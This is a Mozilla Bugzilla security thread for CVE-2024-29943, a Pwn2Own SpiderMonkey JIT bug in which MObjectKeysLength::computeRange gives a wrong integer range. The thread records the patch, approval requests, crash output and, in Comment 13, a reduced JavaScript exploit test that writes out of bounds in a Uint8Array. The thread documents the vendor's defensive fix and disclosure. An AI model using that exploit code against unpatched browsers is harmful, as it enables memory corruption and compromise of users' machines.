# [pwn2own-2024] MObjectKeysLength::computeRange is incorrect

Bug URL: https://bugzilla.mozilla.org/show_bug.cgi?id=1886849
CVE: CVE-2024-29943
Component: JavaScript Engine: JIT
Bounty: (unknown)
Date: 2024-03-21T18:44:15Z
Keywords: csectype-jit, regression, reporter-external, sec-critical

---

**Comment 1 — iireland@mozilla.com — 2024-03-21T18:48:53Z**

Created attachment 9392592
Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem

---

**Comment 2 — jdemooij@mozilla.com — 2024-03-21T19:10:41Z**

Created attachment 9392597
Shell test 1

Initial shell test case. I'm working on a better one that doesn't require this flag.
```
obj-shell-dbgopt/dist/bin/js --no-threads --ion-check-range-analysis test.js
Assertion failure: Integer input should be lower or equal than Upperbound., at mozilla-unified/js/src/jit/VMFunctions.cpp:2978
#01: ??? (???:???)
Trace/breakpoint trap (core dumped)
```

---

**Comment 3 — iireland@mozilla.com — 2024-03-21T19:21:37Z**

Comment on attachment 9392592
Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem

### Security Approval Request
* **How easily could an exploit be constructed based on the patch?**: Medium difficulty. This patch fairly clearly identifies that we got range analysis wrong for MObjectKeysLength, but the writeup makes it clear that getting from that point to an exploit requires some cleverness. I spent some time trying to figure out whether there was an alternative fix that didn't point at range analysis, but I didn't come up with anything reasonable.
* **Do comments in the patch, the check-in comment, or tests included in the patch paint a bulls-eye on the security problem?**: No
* **Which branches (beta, release, and/or ESR) are affected by this flaw, and do the release status flags reflect this affected/unaffected state correctly?**: Beta + Release
* **If not all supported branches, which bug introduced the flaw?**: Bug 1845728
* **Do you have backports for the affected branches?**: No
* **If not, how different, hard to create, and risky will they be?**: This patch should apply trivially.
* **How likely is this patch to cause regressions; how much testing does it need?**: Extremely unlikely. We are simply deleting code.
* **Is the patch ready to land after security approval is given?**: Yes
* **Is Android affected?**: Yes

---

**Comment 4 — jdemooij@mozilla.com — 2024-03-21T19:23:20Z**

Created attachment 9392603
Shell version of exploit

```
obj-shell-opt/dist/bin/js --no-threads --spectre-mitigations=off ~/dev/test.js
Array built
trained
len1: 512
target2 idx: 15
Segmentation fault (core dumped)
```
As described in the write-up, Spectre index masking has to be disabled for this.

---

**Comment 5 — tom@mozilla.com — 2024-03-21T19:44:58Z**

Created attachment 9392607
advisory.txt

---

**Comment 6 — pulsebot@bmo.tld — 2024-03-21T21:18:06Z**

Pushed by smolnar@mozilla.com:
https://hg.mozilla.org/mozilla-central/rev/45d29e78c0d8
Remove MObjectKeysLength::computeRange r=jandem

---

**Comment 7 — aryx.bugmail@gmx-topmail.de — 2024-03-21T21:29:27Z**

https://hg.mozilla.org/mozilla-central/rev/45d29e78c0d8

---

**Comment 8 — iireland@mozilla.com — 2024-03-21T21:48:51Z**

Comment on attachment 9392592
Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem

### Beta/Release Uplift Approval Request
* **User impact if declined**: This bug was used as part of an exploit chain at Pwn2Own.
* **Is this code covered by automated tests?**: Yes
* **Has the fix been verified in Nightly?**: Yes
* **Needs manual test from QE?**: No
* **If yes, steps to reproduce**: None
* **List of other uplifts needed**: None
* **Risk to taking this patch**: Low
* **Why is the change risky/not risky? (and alternatives if risky)**: This patch deletes the code in question. We have verified that it does not affect performance on the code that motivated the original development of this feature.
* **String changes made/needed**: None
* **Is Android affected?**: Yes

---

**Comment 9 — pulsebot@bmo.tld — 2024-03-21T21:54:49Z**

https://hg.mozilla.org/releases/mozilla-beta/rev/8228efc1e07c

---

**Comment 10 — dsmith@mozilla.com — 2024-03-21T21:54:58Z**

Comment on attachment 9392592
Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem

Approved for 125.0b3

---

**Comment 11 — pulsebot@bmo.tld — 2024-03-21T22:59:22Z**

https://hg.mozilla.org/releases/mozilla-release/rev/83c1d327323c

---

**Comment 12 — dsmith@mozilla.com — 2024-03-21T23:04:20Z**

Comment on attachment 9392592
Bug 1886849: Remove MObjectKeysLength::computeRange r=jandem

Approved for 124.0.1 dot release

---

**Comment 13 — iireland@mozilla.com — 2024-03-22T22:19:13Z**

Here's a reduced version of the exploit:
```
// |jit-test| --no-threads; --spectre-mitigations=off

function makeArray(n) {
  let arr = new Uint8Array(n);
  arr.a = 5; arr.b = 5; arr.c = 5; arr.d = 5; arr.e = 5; arr.f = 5;
  return arr;
}
function exploit(foo, x) {
  let neg = Object.keys(x).length + 1879048190;
  neg = Math.max(neg, (-72)|0);
  neg = Math.min(neg, 0);
  let idx = 31;

  for (let i = neg; i <= 20; i++) {
    idx -= 1;
    foo[idx+32] = foo[idx];
  }
}

let arr = makeArray(64);
let long_array = makeArray(2**28-4);

let foo = new Uint8Array(64);
for (let i = 0; i < 2000; i++) {
  exploit(foo, arr);
}
exploit(foo, long_array);
assertEq(foo[0], 0);
```
Unfortunately, with the bug fixed, we bail out when the bounds check fails and run out of memory trying to allocate ~2^28 keys in RObjectKeys::recover. I'm not sure if there's any way to write this testcase that doesn't run into that problem.

---

**Comment 14 — fbraun@mozilla.com — 2024-07-01T11:54:34Z**

There are various public reports of this bug, due to its notoriety as a pwn2own bug. Any objections to making this public?
